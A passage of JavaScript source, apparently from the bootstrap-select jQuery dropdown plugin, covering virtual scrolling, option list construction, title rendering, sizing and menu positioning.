        return (this.options.virtualScroll !== false) && (this.selectpicker.main.elements.length >= this.options.virtualScroll) || this.options.virtualScroll === true;
      },
  
      createView: function (isSearching, scrollTop) {
        scrollTop = scrollTop || 0;
  
        var that = this;
  
        this.selectpicker.current = isSearching ? this.selectpicker.search : this.selectpicker.main;
  
        var active = [];
        var selected;
        var prevActive;
  
        this.setPositionData();
  
        scroll(scrollTop, true);
  
        this.$menuInner.off('scroll.createView').on('scroll.createView', function (e, updateValue) {
          if (!that.noScroll) scroll(this.scrollTop, updateValue);
          that.noScroll = false;
        });
  
        function scroll (scrollTop, init) {
          var size = that.selectpicker.current.elements.length,
              chunks = [],
              chunkSize,
              chunkCount,
              firstChunk,
              lastChunk,
              currentChunk,
              prevPositions,
              positionIsDifferent,
              previousElements,
              menuIsDifferent = true,
              isVirtual = that.isVirtual();
  
          that.selectpicker.view.scrollTop = scrollTop;
  
          if (isVirtual === true) {
            // if an option that is encountered that is wider than the current menu width, update the menu width accordingly
            if (that.sizeInfo.hasScrollBar && that.$menu[0].offsetWidth > that.sizeInfo.totalMenuWidth) {
              that.sizeInfo.menuWidth = that.$menu[0].offsetWidth;
              that.sizeInfo.totalMenuWidth = that.sizeInfo.menuWidth + that.sizeInfo.scrollBarWidth;
              that.$menu.css('min-width', that.sizeInfo.menuWidth);
            }
          }
  
          chunkSize = Math.ceil(that.sizeInfo.menuInnerHeight / that.sizeInfo.liHeight * 1.5); // number of options in a chunk
          chunkCount = Math.round(size / chunkSize) || 1; // number of chunks
  
          for (var i = 0; i < chunkCount; i++) {
            var endOfChunk = (i + 1) * chunkSize;
  
            if (i === chunkCount - 1) {
              endOfChunk = size;
            }
  
            chunks[i] = [
              (i) * chunkSize + (!i ? 0 : 1),
              endOfChunk
            ];
  
            if (!size) break;
  
            if (currentChunk === undefined && scrollTop <= that.selectpicker.current.data[endOfChunk - 1].position - that.sizeInfo.menuInnerHeight) {
              currentChunk = i;
            }
          }
  
          if (currentChunk === undefined) currentChunk = 0;
  
          prevPositions = [that.selectpicker.view.position0, that.selectpicker.view.position1];
  
          // always display previous, current, and next chunks
          firstChunk = Math.max(0, currentChunk - 1);
          lastChunk = Math.min(chunkCount - 1, currentChunk + 1);
  
          that.selectpicker.view.position0 = isVirtual === false ? 0 : (Math.max(0, chunks[firstChunk][0]) || 0);
          that.selectpicker.view.position1 = isVirtual === false ? size : (Math.min(size, chunks[lastChunk][1]) || 0);
  
          positionIsDifferent = prevPositions[0] !== that.selectpicker.view.position0 || prevPositions[1] !== that.selectpicker.view.position1;
  
          if (that.activeIndex !== undefined) {
            prevActive = that.selectpicker.main.elements[that.prevActiveIndex];
            active = that.selectpicker.main.elements[that.activeIndex];
            selected = that.selectpicker.main.elements[that.selectedIndex];
  
            if (init) {
              if (that.activeIndex !== that.selectedIndex && active && active.length) {
                active.classList.remove('active');
                if (active.firstChild) active.firstChild.classList.remove('active');
              }
              that.activeIndex = undefined;
            }
  
            if (that.activeIndex && that.activeIndex !== that.selectedIndex && selected && selected.length) {
              selected.classList.remove('active');
              if (selected.firstChild) selected.firstChild.classList.remove('active');
            }
          }
  
          if (that.prevActiveIndex !== undefined && that.prevActiveIndex !== that.activeIndex && that.prevActiveIndex !== that.selectedIndex && prevActive && prevActive.length) {
            prevActive.classList.remove('active');
            if (prevActive.firstChild) prevActive.firstChild.classList.remove('active');
          }
  
          if (init || positionIsDifferent) {
            previousElements = that.selectpicker.view.visibleElements ? that.selectpicker.view.visibleElements.slice() : [];
  
            if (isVirtual === false) {
              that.selectpicker.view.visibleElements = that.selectpicker.current.elements;
            } else {
              that.selectpicker.view.visibleElements = that.selectpicker.current.elements.slice(that.selectpicker.view.position0, that.selectpicker.view.position1);
            }
  
            that.setOptionStatus();
  
            // if searching, check to make sure the list has actually been updated before updating DOM
            // this prevents unnecessary repaints
            if (isSearching || (isVirtual === false && init)) menuIsDifferent = !isEqual(previousElements, that.selectpicker.view.visibleElements);
  
            // if virtual scroll is disabled and not searching,
            // menu should never need to be updated more than once
            if ((init || isVirtual === true) && menuIsDifferent) {
              var menuInner = that.$menuInner[0],
                  menuFragment = document.createDocumentFragment(),
                  emptyMenu = menuInner.firstChild.cloneNode(false),
                  marginTop,
                  marginBottom,
                  elements = that.selectpicker.view.visibleElements,
                  toSanitize = [];
  
              // replace the existing UL with an empty one - this is faster than $.empty()
              menuInner.replaceChild(emptyMenu, menuInner.firstChild);
  
              for (var i = 0, visibleElementsLen = elements.length; i < visibleElementsLen; i++) {
                var element = elements[i],
                    elText,
                    elementData;
  
                if (that.options.sanitize) {
                  elText = element.lastChild;
  
                  if (elText) {
                    elementData = that.selectpicker.current.data[i + that.selectpicker.view.position0];
  
                    if (elementData && elementData.content && !elementData.sanitized) {
                      toSanitize.push(elText);
                      elementData.sanitized = true;
                    }
                  }
                }
  
                menuFragment.appendChild(element);
              }
  
              if (that.options.sanitize && toSanitize.length) {
                sanitizeHtml(toSanitize, that.options.whiteList, that.options.sanitizeFn);
              }
  
              if (isVirtual === true) {
                marginTop = (that.selectpicker.view.position0 === 0 ? 0 : that.selectpicker.current.data[that.selectpicker.view.position0 - 1].position);
                marginBottom = (that.selectpicker.view.position1 > size - 1 ? 0 : that.selectpicker.current.data[size - 1].position - that.selectpicker.current.data[that.selectpicker.view.position1 - 1].position);
  
                menuInner.firstChild.style.marginTop = marginTop + 'px';
                menuInner.firstChild.style.marginBottom = marginBottom + 'px';
              }
  
              menuInner.firstChild.appendChild(menuFragment);
            }
          }
  
          that.prevActiveIndex = that.activeIndex;
  
          if (!that.options.liveSearch) {
            that.$menuInner.trigger('focus');
          } else if (isSearching && init) {
            var index = 0,
                newActive;
  
            if (!that.selectpicker.view.canHighlight[index]) {
              index = 1 + that.selectpicker.view.canHighlight.slice(1).indexOf(true);
            }
  
            newActive = that.selectpicker.view.visibleElements[index];
  
            if (that.selectpicker.view.currentActive) {
              that.selectpicker.view.currentActive.classList.remove('active');
              if (that.selectpicker.view.currentActive.firstChild) that.selectpicker.view.currentActive.firstChild.classList.remove('active');
            }
  
            if (newActive) {
              newActive.classList.add('active');
              if (newActive.firstChild) newActive.firstChild.classList.add('active');
            }
  
            that.activeIndex = (that.selectpicker.current.data[index] || {}).index;
          }
        }
  
        $(window)
          .off('resize' + EVENT_KEY + '.' + this.selectId + '.createView')
          .on('resize' + EVENT_KEY + '.' + this.selectId + '.createView', function () {
            var isActive = that.$newElement.hasClass(classNames.SHOW);
  
            if (isActive) scroll(that.$menuInner[0].scrollTop);
          });
      },
  
      setPlaceholder: function () {
        var updateIndex = false;
  
        if (this.options.title && !this.multiple) {
          if (!this.selectpicker.view.titleOption) this.selectpicker.view.titleOption = document.createElement('option');
  
          // this option doesn't create a new <li> element, but does add a new option at the start,
          // so startIndex should increase to prevent having to check every option for the bs-title-option class
          updateIndex = true;
  
          var element = this.$element[0],
              isSelected = false,
              titleNotAppended = !this.selectpicker.view.titleOption.parentNode;
  
          if (titleNotAppended) {
            // Use native JS to prepend option (faster)
            this.selectpicker.view.titleOption.className = 'bs-title-option';
            this.selectpicker.view.titleOption.value = '';
  
            // Check if selected or data-selected attribute is already set on an option. If not, select the titleOption option.
            // the selected item may have been changed by user or programmatically before the bootstrap select plugin runs,
            // if so, the select will have the data-selected attribute
            var $opt = $(element.options[element.selectedIndex]);
            isSelected = $opt.attr('selected') === undefined && this.$element.data('selected') === undefined;
          }
  
          if (titleNotAppended || this.selectpicker.view.titleOption.index !== 0) {
            element.insertBefore(this.selectpicker.view.titleOption, element.firstChild);
          }
  
          // Set selected *after* appending to select,
          // otherwise the option doesn't get selected in IE
          // set using selectedIndex, as setting the selected attr to true here doesn't work in IE11
          if (isSelected) element.selectedIndex = 0;
        }
  
        return updateIndex;
      },
  
      createLi: function () {
        var that = this,
            iconBase = this.options.iconBase,
            optionSelector = ':not([hidden]):not([data-hidden="true"])',
            mainElements = [],
            mainData = [],
            widestOptionLength = 0,
            optID = 0,
            startIndex = this.setPlaceholder() ? 1 : 0; // append the titleOption if necessary and skip the first option in the loop
  
        if (this.options.hideDisabled) optionSelector += ':not(:disabled)';
  
        if ((that.options.showTick || that.multiple) && !elementTemplates.checkMark.parentNode) {
          elementTemplates.checkMark.className = iconBase + ' ' + that.options.tickIcon + ' check-mark';
          elementTemplates.a.appendChild(elementTemplates.checkMark);
        }
  
        var selectOptions = this.$element[0].querySelectorAll('select > *' + optionSelector);
  
        function addDivider (config) {
          var previousData = mainData[mainData.length - 1];
  
          // ensure optgroup doesn't create back-to-back dividers
          if (
            previousData &&
            previousData.type === 'divider' &&
            (previousData.optID || config.optID)
          ) {
            return;
          }
  
          config = config || {};
          config.type = 'divider';
  
          mainElements.push(
            generateOption.li(
              false,
              classNames.DIVIDER,
              (config.optID ? config.optID + 'div' : undefined)
            )
          );
  
          mainData.push(config);
        }
  
        function addOption (option, config) {
          config = config || {};
  
          config.divider = option.getAttribute('data-divider') === 'true';
  
          if (config.divider) {
            addDivider({
              optID: config.optID
            });
          } else {
            var liIndex = mainData.length,
                cssText = option.style.cssText,
                inlineStyle = cssText ? htmlEscape(cssText) : '',
                optionClass = (option.className || '') + (config.optgroupClass || '');
  
            if (config.optID) optionClass = 'opt ' + optionClass;
  
            config.text = option.textContent;
  
            config.content = option.getAttribute('data-content');
            config.tokens = option.getAttribute('data-tokens');
            config.subtext = option.getAttribute('data-subtext');
            config.icon = option.getAttribute('data-icon');
            config.iconBase = iconBase;
  
            var textElement = generateOption.text(config);
  
            mainElements.push(
              generateOption.li(
                generateOption.a(
                  textElement,
                  optionClass,
                  inlineStyle
                ),
                '',
                config.optID
              )
            );
  
            option.liIndex = liIndex;
  
            config.display = config.content || config.text;
            config.type = 'option';
            config.index = liIndex;
            config.option = option;
            config.disabled = config.disabled || option.disabled;
  
            mainData.push(config);
  
            var combinedLength = 0;
  
            // count the number of characters in the option - not perfect, but should work in most cases
            if (config.display) combinedLength += config.display.length;
            if (config.subtext) combinedLength += config.subtext.length;
            // if there is an icon, ensure this option's width is checked
            if (config.icon) combinedLength += 1;
  
            if (combinedLength > widestOptionLength) {
              widestOptionLength = combinedLength;
  
              // guess which option is the widest
              // use this when calculating menu width
              // not perfect, but it's fast, and the width will be updating accordingly when scrolling
              that.selectpicker.view.widestOption = mainElements[mainElements.length - 1];
            }
          }
        }
  
        function addOptgroup (index, selectOptions) {
          var optgroup = selectOptions[index],
              previous = selectOptions[index - 1],
              next = selectOptions[index + 1],
              options = optgroup.querySelectorAll('option' + optionSelector);
  
          if (!options.length) return;
  
          var config = {
                label: htmlEscape(optgroup.label),
                subtext: optgroup.getAttribute('data-subtext'),
                icon: optgroup.getAttribute('data-icon'),
                iconBase: iconBase
              },
              optgroupClass = ' ' + (optgroup.className || ''),
              headerIndex,
              lastIndex;
  
          optID++;
  
          if (previous) {
            addDivider({ optID: optID });
          }
  
          var labelElement = generateOption.label(config);
  
          mainElements.push(
            generateOption.li(labelElement, 'dropdown-header' + optgroupClass, optID)
          );
  
          mainData.push({
            display: config.label,
            subtext: config.subtext,
            type: 'optgroup-label',
            optID: optID
          });
  
          for (var j = 0, len = options.length; j < len; j++) {
            var option = options[j];
  
            if (j === 0) {
              headerIndex = mainData.length - 1;
              lastIndex = headerIndex + len;
            }
  
            addOption(option, {
              headerIndex: headerIndex,
              lastIndex: lastIndex,
              optID: optID,
              optgroupClass: optgroupClass,
              disabled: optgroup.disabled
            });
          }
  
          if (next) {
            addDivider({ optID: optID });
          }
        }
  
        for (var len = selectOptions.length; startIndex < len; startIndex++) {
          var item = selectOptions[startIndex];
  
          if (item.tagName !== 'OPTGROUP') {
            addOption(item, {});
          } else {
            addOptgroup(startIndex, selectOptions);
          }
        }
  
        this.selectpicker.main.elements = mainElements;
        this.selectpicker.main.data = mainData;
  
        this.selectpicker.current = this.selectpicker.main;
      },
  
      findLis: function () {
        return this.$menuInner.find('.inner > li');
      },
  
      render: function () {
        // ensure titleOption is appended and selected (if necessary) before getting selectedOptions
        this.setPlaceholder();
  
        var that = this,
            selectedOptions = this.$element[0].selectedOptions,
            selectedCount = selectedOptions.length,
            button = this.$button[0],
            buttonInner = button.querySelector('.filter-option-inner-inner'),
            multipleSeparator = document.createTextNode(this.options.multipleSeparator),
            titleFragment = elementTemplates.fragment.cloneNode(false),
            showCount,
            countMax,
            hasContent = false;
  
        this.togglePlaceholder();
  
        this.tabIndex();
  
        if (this.options.selectedTextFormat === 'static') {
          titleFragment = generateOption.text({ text: this.options.title }, true);
        } else {
          showCount = this.multiple && this.options.selectedTextFormat.indexOf('count') !== -1 && selectedCount > 1;
  
          // determine if the number of selected options will be shown (showCount === true)
          if (showCount) {
            countMax = this.options.selectedTextFormat.split('>');
            showCount = (countMax.length > 1 && selectedCount > countMax[1]) || (countMax.length === 1 && selectedCount >= 2);
          }
  
          // only loop through all selected options if the count won't be shown
          if (showCount === false) {
            for (var selectedIndex = 0; selectedIndex < selectedCount; selectedIndex++) {
              if (selectedIndex < 50) {
                var option = selectedOptions[selectedIndex],
                    titleOptions = {},
                    thisData = {
                      content: option.getAttribute('data-content'),
                      subtext: option.getAttribute('data-subtext'),
                      icon: option.getAttribute('data-icon')
                    };
  
                if (this.multiple && selectedIndex > 0) {
                  titleFragment.appendChild(multipleSeparator.cloneNode(false));
                }
  
                if (option.title) {
                  titleOptions.text = option.title;
                } else if (thisData.content && that.options.showContent) {
                  titleOptions.content = thisData.content.toString();
                  hasContent = true;
                } else {
                  if (that.options.showIcon) {
                    titleOptions.icon = thisData.icon;
                    titleOptions.iconBase = this.options.iconBase;
                  }
                  if (that.options.showSubtext && !that.multiple && thisData.subtext) titleOptions.subtext = ' ' + thisData.subtext;
                  titleOptions.text = option.textContent.trim();
                }
  
                titleFragment.appendChild(generateOption.text(titleOptions, true));
              } else {
                break;
              }
            }
  
            // add ellipsis
            if (selectedCount > 49) {
              titleFragment.appendChild(document.createTextNode('...'));
            }
          } else {
            var optionSelector = ':not([hidden]):not([data-hidden="true"]):not([data-divider="true"])';
            if (this.options.hideDisabled) optionSelector += ':not(:disabled)';
  
            // If this is a multiselect, and selectedTextFormat is count, then show 1 of 2 selected, etc.
            var totalCount = this.$element[0].querySelectorAll('select > option' + optionSelector + ', optgroup' + optionSelector + ' option' + optionSelector).length,
                tr8nText = (typeof this.options.countSelectedText === 'function') ? this.options.countSelectedText(selectedCount, totalCount) : this.options.countSelectedText;
  
            titleFragment = generateOption.text({
              text: tr8nText.replace('{0}', selectedCount.toString()).replace('{1}', totalCount.toString())
            }, true);
          }
        }
  
        if (this.options.title == undefined) {
          // use .attr to ensure undefined is returned if title attribute is not set
          this.options.title = this.$element.attr('title');
        }
  
        // If the select doesn't have a title, then use the default, or if nothing is set at all, use noneSelectedText
        if (!titleFragment.childNodes.length) {
          titleFragment = generateOption.text({
            text: typeof this.options.title !== 'undefined' ? this.options.title : this.options.noneSelectedText
          }, true);
        }
  
        // strip all HTML tags and trim the result, then unescape any escaped tags
        button.title = titleFragment.textContent.replace(/<[^>]*>?/g, '').trim();
  
        if (this.options.sanitize && hasContent) {
          sanitizeHtml([titleFragment], that.options.whiteList, that.options.sanitizeFn);
        }
  
        buttonInner.innerHTML = '';
        buttonInner.appendChild(titleFragment);
  
        if (version.major < 4 && this.$newElement[0].classList.contains('bs3-has-addon')) {
          var filterExpand = button.querySelector('.filter-expand'),
              clone = buttonInner.cloneNode(true);
  
          clone.className = 'filter-expand';
  
          if (filterExpand) {
            button.replaceChild(clone, filterExpand);
          } else {
            button.appendChild(clone);
          }
        }
  
        this.$element.trigger('rendered' + EVENT_KEY);
      },
  
      /**
       * @param [style]
       * @param [status]
       */
      setStyle: function (newStyle, status) {
        var button = this.$button[0],
            newElement = this.$newElement[0],
            style = this.options.style.trim(),
            buttonClass;
  
        if (this.$element.attr('class')) {
          this.$newElement.addClass(this.$element.attr('class').replace(/selectpicker|mobile-device|bs-select-hidden|validate\[.*\]/gi, ''));
        }
  
        if (version.major < 4) {
          newElement.classList.add('bs3');
  
          if (newElement.parentNode.classList.contains('input-group') &&
              (newElement.previousElementSibling || newElement.nextElementSibling) &&
              (newElement.previousElementSibling || newElement.nextElementSibling).classList.contains('input-group-addon')
          ) {
            newElement.classList.add('bs3-has-addon');
          }
        }
  
        if (newStyle) {
          buttonClass = newStyle.trim();
        } else {
          buttonClass = style;
        }
  
        if (status == 'add') {
          if (buttonClass) button.classList.add.apply(button.classList, buttonClass.split(' '));
        } else if (status == 'remove') {
          if (buttonClass) button.classList.remove.apply(button.classList, buttonClass.split(' '));
        } else {
          if (style) button.classList.remove.apply(button.classList, style.split(' '));
          if (buttonClass) button.classList.add.apply(button.classList, buttonClass.split(' '));
        }
      },
  
      liHeight: function (refresh) {
        if (!refresh && (this.options.size === false || this.sizeInfo)) return;
  
        if (!this.sizeInfo) this.sizeInfo = {};
  
        var newElement = document.createElement('div'),
            menu = document.createElement('div'),
            menuInner = document.createElement('div'),
            menuInnerInner = document.createElement('ul'),
            divider = document.createElement('li'),
            dropdownHeader = document.createElement('li'),
            li = document.createElement('li'),
            a = document.createElement('a'),
            text = document.createElement('span'),
            header = this.options.header && this.$menu.find('.' + classNames.POPOVERHEADER).length > 0 ? this.$menu.find('.' + classNames.POPOVERHEADER)[0].cloneNode(true) : null,
            search = this.options.liveSearch ? document.createElement('div') : null,
            actions = this.options.actionsBox && this.multiple && this.$menu.find('.bs-actionsbox').length > 0 ? this.$menu.find('.bs-actionsbox')[0].cloneNode(true) : null,
            doneButton = this.options.doneButton && this.multiple && this.$menu.find('.bs-donebutton').length > 0 ? this.$menu.find('.bs-donebutton')[0].cloneNode(true) : null,
            firstOption = this.$element.find('option')[0];
  
        this.sizeInfo.selectWidth = this.$newElement[0].offsetWidth;
  
        text.className = 'text';
        a.className = 'dropdown-item ' + (firstOption ? firstOption.className : '');
        newElement.className = this.$menu[0].parentNode.className + ' ' + classNames.SHOW;
        newElement.style.width = this.sizeInfo.selectWidth + 'px';
        if (this.options.width === 'auto') menu.style.minWidth = 0;
        menu.className = classNames.MENU + ' ' + classNames.SHOW;
        menuInner.className = 'inner ' + classNames.SHOW;
        menuInnerInner.className = classNames.MENU + ' inner ' + (version.major === '4' ? classNames.SHOW : '');
        divider.className = classNames.DIVIDER;
        dropdownHeader.className = 'dropdown-header';
  
        text.appendChild(document.createTextNode('\u200b'));
        a.appendChild(text);
        li.appendChild(a);
        dropdownHeader.appendChild(text.cloneNode(true));
  
        if (this.selectpicker.view.widestOption) {
          menuInnerInner.appendChild(this.selectpicker.view.widestOption.cloneNode(true));
        }
  
        menuInnerInner.appendChild(li);
        menuInnerInner.appendChild(divider);
        menuInnerInner.appendChild(dropdownHeader);
        if (header) menu.appendChild(header);
        if (search) {
          var input = document.createElement('input');
          search.className = 'bs-searchbox';
          input.className = 'form-control';
          search.appendChild(input);
          menu.appendChild(search);
        }
        if (actions) menu.appendChild(actions);
        menuInner.appendChild(menuInnerInner);
        menu.appendChild(menuInner);
        if (doneButton) menu.appendChild(doneButton);
        newElement.appendChild(menu);
  
        document.body.appendChild(newElement);
  
        var liHeight = li.offsetHeight,
            dropdownHeaderHeight = dropdownHeader ? dropdownHeader.offsetHeight : 0,
            headerHeight = header ? header.offsetHeight : 0,
            searchHeight = search ? search.offsetHeight : 0,
            actionsHeight = actions ? actions.offsetHeight : 0,
            doneButtonHeight = doneButton ? doneButton.offsetHeight : 0,
            dividerHeight = $(divider).outerHeight(true),
            // fall back to jQuery if getComputedStyle is not supported
            menuStyle = window.getComputedStyle ? window.getComputedStyle(menu) : false,
            menuWidth = menu.offsetWidth,
            $menu = menuStyle ? null : $(menu),
            menuPadding = {
              vert: toInteger(menuStyle ? menuStyle.paddingTop : $menu.css('paddingTop')) +
                    toInteger(menuStyle ? menuStyle.paddingBottom : $menu.css('paddingBottom')) +
                    toInteger(menuStyle ? menuStyle.borderTopWidth : $menu.css('borderTopWidth')) +
                    toInteger(menuStyle ? menuStyle.borderBottomWidth : $menu.css('borderBottomWidth')),
              horiz: toInteger(menuStyle ? menuStyle.paddingLeft : $menu.css('paddingLeft')) +
                    toInteger(menuStyle ? menuStyle.paddingRight : $menu.css('paddingRight')) +
                    toInteger(menuStyle ? menuStyle.borderLeftWidth : $menu.css('borderLeftWidth')) +
                    toInteger(menuStyle ? menuStyle.borderRightWidth : $menu.css('borderRightWidth'))
            },
            menuExtras = {
              vert: menuPadding.vert +
                    toInteger(menuStyle ? menuStyle.marginTop : $menu.css('marginTop')) +
                    toInteger(menuStyle ? menuStyle.marginBottom : $menu.css('marginBottom')) + 2,
              horiz: menuPadding.horiz +
                    toInteger(menuStyle ? menuStyle.marginLeft : $menu.css('marginLeft')) +
                    toInteger(menuStyle ? menuStyle.marginRight : $menu.css('marginRight')) + 2
            },
            scrollBarWidth;
  
        menuInner.style.overflowY = 'scroll';
  
        scrollBarWidth = menu.offsetWidth - menuWidth;
  
        document.body.removeChild(newElement);
  
        this.sizeInfo.liHeight = liHeight;
        this.sizeInfo.dropdownHeaderHeight = dropdownHeaderHeight;
        this.sizeInfo.headerHeight = headerHeight;
        this.sizeInfo.searchHeight = searchHeight;
        this.sizeInfo.actionsHeight = actionsHeight;
        this.sizeInfo.doneButtonHeight = doneButtonHeight;
        this.sizeInfo.dividerHeight = dividerHeight;
        this.sizeInfo.menuPadding = menuPadding;
        this.sizeInfo.menuExtras = menuExtras;
        this.sizeInfo.menuWidth = menuWidth;
        this.sizeInfo.totalMenuWidth = this.sizeInfo.menuWidth;
        this.sizeInfo.scrollBarWidth = scrollBarWidth;
        this.sizeInfo.selectHeight = this.$newElement[0].offsetHeight;
  
        this.setPositionData();
      },
  
      getSelectPosition: function () {
        var that = this,
            $window = $(window),
            pos = that.$newElement.offset(),
            $container = $(that.options.container),
            containerPos;
  
        if (that.options.container && $container.length && !$container.is('body')) {
          containerPos = $container.offset();
          containerPos.top += parseInt($container.css('borderTopWidth'));
          containerPos.left += parseInt($container.css('borderLeftWidth'));
        } else {
          containerPos = { top: 0, left: 0 };
        }
  
        var winPad = that.options.windowPadding;
  
        this.sizeInfo.selectOffsetTop = pos.top - containerPos.top - $window.scrollTop();
        this.sizeInfo.selectOffsetBot = $window.height() - this.sizeInfo.selectOffsetTop - this.sizeInfo.selectHeight - containerPos.top - winPad[2];
        this.sizeInfo.selectOffsetLeft = pos.left - containerPos.left - $window.scrollLeft();
        this.sizeInfo.selectOffsetRight = $window.width() - this.sizeInfo.selectOffsetLeft - this.sizeInfo.selectWidth - containerPos.left - winPad[1];
        this.sizeInfo.selectOffsetTop -= winPad[0];
        this.sizeInfo.selectOffsetLeft -= winPad[3];
      },
  
      setMenuSize: function (isAuto) {
        this.getSelectPosition();
  
        var selectWidth = this.sizeInfo.selectWidth,
            liHeight = this.sizeInfo.liHeight,
            headerHeight = this.sizeInfo.headerHeight,
            searchHeight = this.sizeInfo.searchHeight,
            actionsHeight = this.sizeInfo.actionsHeight,
            doneButtonHeight = this.sizeInfo.doneButtonHeight,
            divHeight = this.sizeInfo.dividerHeight,
            menuPadding = this.sizeInfo.menuPadding,
            menuInnerHeight,
            menuHeight,
            divLength = 0,
            minHeight,
            _minHeight,
            maxHeight,
            menuInnerMinHeight,
            estimate;
  
        if (this.options.dropupAuto) {
          // Get the estimated height of the menu without scrollbars.
          // This is useful for smaller menus, where there might be plenty of room
          // below the button without setting dropup, but we can't know
          // the exact height of the menu until createView is called later
          estimate = liHeight * this.selectpicker.current.elements.length + menuPadding.vert;
          this.$newElement.toggleClass(classNames.DROPUP, this.sizeInfo.selectOffsetTop - this.sizeInfo.selectOffsetBot > this.sizeInfo.menuExtras.vert && estimate + this.sizeInfo.menuExtras.vert + 50 > this.sizeInfo.selectOffsetBot);
        }
  
        if (this.options.size === 'auto') {
          _minHeight = this.selectpicker.current.elements.length > 3 ? this.sizeInfo.liHeight * 3 + this.sizeInfo.menuExtras.vert - 2 : 0;
          menuHeight = this.sizeInfo.selectOffsetBot - this.sizeInfo.menuExtras.vert;
          minHeight = _minHeight + headerHeight + searchHeight + actionsHeight + doneButtonHeight;
          menuInnerMinHeight = Math.max(_minHeight - menuPadding.vert, 0);
  
          if (this.$newElement.hasClass(classNames.DROPUP)) {
            menuHeight = this.sizeInfo.selectOffsetTop - this.sizeInfo.menuExtras.vert;
          }
  
          maxHeight = menuHeight;
          menuInnerHeight = menuHeight - headerHeight - searchHeight - actionsHeight - doneButtonHeight - menuPadding.vert;
        } else if (this.options.size && this.options.size != 'auto' && this.selectpicker.current.elements.length > this.options.size) {
          for (var i = 0; i < this.options.size; i++) {
            if (this.selectpicker.current.data[i].type === 'divider') divLength++;
          }
  
          menuHeight = liHeight * this.options.size + divLength * divHeight + menuPadding.vert;
          menuInnerHeight = menuHeight - menuPadding.vert;
          maxHeight = menuHeight + headerHeight + searchHeight + actionsHeight + doneButtonHeight;
          minHeight = menuInnerMinHeight = '';
        }
  
        if (this.options.dropdownAlignRight === 'auto') {
          this.$menu.toggleClass(classNames.MENURIGHT, this.sizeInfo.selectOffsetLeft > this.sizeInfo.selectOffsetRight && this.sizeInfo.selectOffsetRight < (this.sizeInfo.totalMenuWidth - selectWidth));
        }
  
        this.$menu.css({
          'max-height': maxHeight + 'px',
          'overflow': 'hidden',
          'min-height': minHeight + 'px'
        });
  
        this.$menuInner.css({
          'max-height': menuInnerHeight + 'px',
          'overflow-y': 'auto',
          'min-height': menuInnerMinHeight + 'px'
        });
  
        // ensure menuInnerHeight is always a positive number to prevent issues calculating chunkSize in createView
        this.sizeInfo.menuInnerHeight = Math.max(menuInnerHeight, 1);
  
        if (this.selectpicker.current.data.length && this.selectpicker.current.data[this.selectpicker.current.data.length - 1].position > this.sizeInfo.menuInnerHeight) {
          this.sizeInfo.hasScrollBar = true;
          this.sizeInfo.totalMenuWidth = this.sizeInfo.menuWidth + this.sizeInfo.scrollBarWidth;
  
          this.$menu.css('min-width', this.sizeInfo.totalMenuWidth);
        }
  
        if (this.dropdown && this.dropdown._popper) this.dropdown._popper.update();
      },
  
      setSize: function (refresh) {
        this.liHeight(refresh);
  
        if (this.options.header) this.$menu.css('padding-top', 0);
        if (this.options.size === false) return;
  
        var that = this,
            $window = $(window),
            selectedIndex,
            offset = 0;
  
        this.setMenuSize();
  
        if (this.options.liveSearch) {
          this.$searchbox
            .off('input.setMenuSize propertychange.setMenuSize')
            .on('input.setMenuSize propertychange.setMenuSize', function () {
              return that.setMenuSize();
            });
        }
  
        if (this.options.size === 'auto') {
          $window
            .off('resize' + EVENT_KEY + '.' + this.selectId + '.setMenuSize' + ' scroll' + EVENT_KEY + '.' + this.selectId + '.setMenuSize')
            .on('resize' + EVENT_KEY + '.' + this.selectId + '.setMenuSize' + ' scroll' + EVENT_KEY + '.' + this.selectId + '.setMenuSize', function () {
              return that.setMenuSize();
            });
        } else if (this.options.size && this.options.size != 'auto' && this.selectpicker.current.elements.length > this.options.size) {
          $window.off('resize' + EVENT_KEY + '.' + this.selectId + '.setMenuSize' + ' scroll' + EVENT_KEY + '.' + this.selectId + '.setMenuSize');
        }
  
        if (refresh) {
          offset = this.$menuInner[0].scrollTop;
        } else if (!that.multiple) {
          var element = that.$element[0];
          selectedIndex = (element.options[element.selectedIndex] || {}).liIndex;
  
          if (typeof selectedIndex === 'number' && that.options.size !== false) {
            offset = that.sizeInfo.liHeight * selectedIndex;
            offset = offset - (that.sizeInfo.menuInnerHeight / 2) + (that.sizeInfo.liHeight / 2);
          }
        }
  
        that.createView(false, offset);
      },
  
      setWidth: function () {
        var that = this;
  
        if (this.options.width === 'auto') {
          requestAnimationFrame(function () {
            that.$menu.css('min-width', '0');
  
            that.$element.on('loaded' + EVENT_KEY, function () {
              that.liHeight();
              that.setMenuSize();
  
              // Get correct width if element is hidden
              var $selectClone = that.$newElement.clone().appendTo('body'),
                  btnWidth = $selectClone.css('width', 'auto').children('button').outerWidth();
  
              $selectClone.remove();
  
              // Set width to whatever's larger, button title or longest option
              that.sizeInfo.selectWidth = Math.max(that.sizeInfo.totalMenuWidth, btnWidth);
              that.$newElement.css('width', that.sizeInfo.selectWidth + 'px');
            });
          });
        } else if (this.options.width === 'fit') {
          // Remove inline min-width so width can be changed from 'auto'
          this.$menu.css('min-width', '');
          this.$newElement.css('width', '').addClass('fit-width');
        } else if (this.options.width) {
          // Remove inline min-width so width can be changed from 'auto'
          this.$menu.css('min-width', '');
          this.$newElement.css('width', this.options.width);
        } else {
          // Remove inline min-width/width so width can be changed
          this.$menu.css('min-width', '');
          this.$newElement.css('width', '');
        }
        // Remove fit-width class if width is changed programmatically
        if (this.$newElement.hasClass('fit-width') && this.options.width !== 'fit') {
          this.$newElement[0].classList.remove('fit-width');
        }
      },
  
      selectPosition: function () {
        this.$bsContainer = $('<div class="bs-container" />');
  
        var that = this,
            $container = $(this.options.container),
            pos,
            containerPos,
            actualHeight,
            getPlacement = function ($element) {
              var containerPosition = {},
                  // fall back to dropdown's default display setting if display is not manually set
                  display = that.options.display || (
                    // Bootstrap 3 doesn't have $.fn.dropdown.Constructor.Default
                    $.fn.dropdown.Constructor.Default ? $.fn.dropdown.Constructor.Default.display
                    : false
                  );
  
              that.$bsContainer.addClass($element.attr('class').replace(/form-control|fit-width/gi, '')).toggleClass(classNames.DROPUP, $element.hasClass(classNames.DROPUP));
              pos = $element.offset();
  
              if (!$container.is('body')) {
                containerPos = $container.offset();
                containerPos.top += parseInt($container.css('borderTopWidth')) - $container.scrollTop();
                containerPos.left += parseInt($container.css('borderLeftWidth')) - $container.scrollLeft();
              } else {
                containerPos = { top: 0, left: 0 };
              }
  
              actualHeight = $element.hasClass(classNames.DROPUP) ? 0 : $element[0].offsetHeight;
  
              // Bootstrap 4+ uses Popper for menu positioning
